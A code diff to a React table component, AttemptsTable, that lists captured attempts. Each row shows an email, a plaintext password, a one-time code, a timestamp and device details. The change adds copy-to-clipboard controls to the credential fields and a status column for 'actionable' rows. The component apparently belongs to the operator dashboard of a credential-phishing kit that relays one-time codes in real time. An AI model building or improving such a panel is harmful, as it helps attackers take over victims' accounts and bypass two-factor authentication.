@@ -734,14 +734,22 @@ function AttemptsTable({
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground font-mono-tabular">
                   {formatTime(row.codeAt)}
                 </td>
-                <td className="break-all px-4 py-3 font-mono text-xs">{row.email}</td>
-                <td className="break-all px-4 py-3 font-mono text-xs">{row.password}</td>
-                <td className="px-4 py-3 font-mono text-sm tracking-widest">{row.code}</td>
-                <td className="whitespace-nowrap px-4 py-3 text-xs">
-                  <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
-                    {screenLabel}
-                  </span>
+                <td className="break-all px-4 py-3 font-mono text-xs">
+                  <CopyText value={row.email} />
                 </td>
+                <td className="break-all px-4 py-3 font-mono text-xs">
+                  <CopyText value={row.password} />
+                </td>
+                <td className="px-4 py-3 font-mono text-sm tracking-widest">
+                  <CopyText value={row.code} className="tracking-widest" />
+                </td>
+                {actionable && (
+                  <td className="whitespace-nowrap px-4 py-3 text-xs">
+                    <span className="inline-flex items-center gap-1 rounded-full bg-primary/15 px-2 py-0.5 text-primary">
+                      {screenLabel}
+                    </span>
+                  </td>
+                )}
                 <td className="whitespace-nowrap px-4 py-3 text-xs text-muted-foreground">{deviceLabel(ua)}</td>
               </tr>
               {actionable && (
